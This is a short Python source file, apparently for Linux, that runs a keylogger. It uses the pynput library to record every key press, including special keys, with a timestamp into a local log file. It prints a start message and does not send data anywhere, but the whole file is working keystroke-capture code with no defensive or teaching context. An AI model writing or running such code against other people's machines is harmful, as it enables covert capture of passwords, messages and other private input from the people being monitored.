from pynput import keyboard
import logging
from datetime import datetime
import os

# Create logs directory
if not os.path.exists("logs"):
    os.makedirs("logs")

# Log file with timestamp
log_file = f"logs/linux_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# On key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start keylogger
def start_keylogger():
    print("Keylogger started on Linux... Press CTRL+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
